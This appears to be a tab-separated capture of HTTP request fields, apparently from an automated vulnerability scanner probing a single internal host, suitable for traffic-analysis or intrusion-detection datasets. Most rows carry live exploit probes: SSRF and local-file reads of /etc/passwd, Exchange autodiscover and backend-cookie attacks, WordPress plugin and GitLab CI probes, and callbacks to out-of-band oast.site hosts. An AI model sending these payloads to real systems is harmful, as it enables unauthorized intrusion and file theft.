http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/?host=http://0177.0.0.1/server-status		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/?host=http://0177.0.0.1/server-status
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/?file=http://0177.0.0.1/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/?file=http://0177.0.0.1/etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/docpicker/internal_proxy/http/example.com		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/docpicker/internal_proxy/http/example.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://notburpcollaborator.net		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://notburpcollaborator.net
	gzip																close		21	21	application/json;charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/casa/nodes/thumbprints		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/casa/nodes/thumbprints
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/w3-total-cache/pub/minify.php?file=yygpKbDS1y9Ky9TLSy0uLi3Wyy9KB3NLKkqUM4CyxUDpxKzECr30_Pz0nNTEgsxiveT8XAA.css		GET				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/wp-content/plugins/w3-total-cache/pub/minify.php?file=yygpKbDS1y9Ky9TLSy0uLi3Wyy9KB3NLKkqUM4CyxUDpxKzECr30_Pz0nNTEgsxiveT8XAA.css
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wavemaker/studioService.download?method=getContent&inUrl=file///etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36				/web/wavemaker/studioService.download?method=getContent&inUrl=file///etc/passwd
*/*	gzip	en															close		55	55							192.168.1.104															1	http://192.168.1.104/web/OA_HTML/lcmServiceController.jsp		POST				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/OA_HTML/lcmServiceController.jsp
	gzip																close		96	96	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/w3-total-cache/pub/sns.php		PUT				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/wp-content/plugins/w3-total-cache/pub/sns.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wps/PA_WCM_Authoring_UI/proxy/http/example.com		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/wps/PA_WCM_Authoring_UI/proxy/http/example.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/MicroStrategy/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https://google.com		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/MicroStrategy/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https://google.com
*/*	gzip	en															close		28	28							192.168.1.104															1	http://192.168.1.104/web/filemanager/upload.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/filemanager/upload.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com
	gzip																close		109	109	application/json						192.168.1.104														http://192.168.1.104/web	1	http://192.168.1.104/web/api/v4/ci/lint?include_merged_yaml=true		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/api/v4/ci/lint?include_merged_yaml=true
	gzip																close		1027	1027	application/xml						192.168.1.104															1	http://192.168.1.104/web/client		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/client
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/canto/includes/lib/detail.php?subdomain=c8aci819m8v9dqeihrd0cekc1eeyyyyyw.oast.site		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/wp-content/plugins/canto/includes/lib/detail.php?subdomain=c8aci819m8v9dqeihrd0cekc1eeyyyyyw.oast.site
	gzip	en-US,en;q=0.9															close		399	399	application/json						192.168.1.104															1	http://192.168.1.104/web/connect/register		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/connect/register
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=https://c8aci819m8v9dqeihrd0cekc1eeyyyyye.oast.site		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=https://c8aci819m8v9dqeihrd0cekc1eeyyyyye.oast.site
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://c8aci819m8v9dqeihrd0cekc1eeyyyyy1.oast.site%23.salesforce.com/		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://c8aci819m8v9dqeihrd0cekc1eeyyyyy1.oast.site%23.salesforce.com/
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/ui/vropspluginui/rest/services/getvcdetails		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/ui/vropspluginui/rest/services/getvcdetails
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/owa/auth/x.js		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36			X-AnonResource=true; X-AnonResource-Backend=c8aci819m8v9dqeihrd0cekc1eeyyyyyq.oast.site/ecp/default.flt?~3;	/web/owa/auth/x.js
*/*											no-transform																c8aci819m8v9dqeihrd0cekc1eeyyyyy6.oast.site															1	http://c8aci819m8v9dqeihrd0cekc1eeyyyyy6.oast.site/web		GET				HTTP/1.1																							/web
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/Umbraco/feedproxy.aspx?url=http://c8aci819m8v9dqeihrd0cekc1eeyyyyyg.oast.site		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/Umbraco/feedproxy.aspx?url=http://c8aci819m8v9dqeihrd0cekc1eeyyyyyg.oast.site
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web
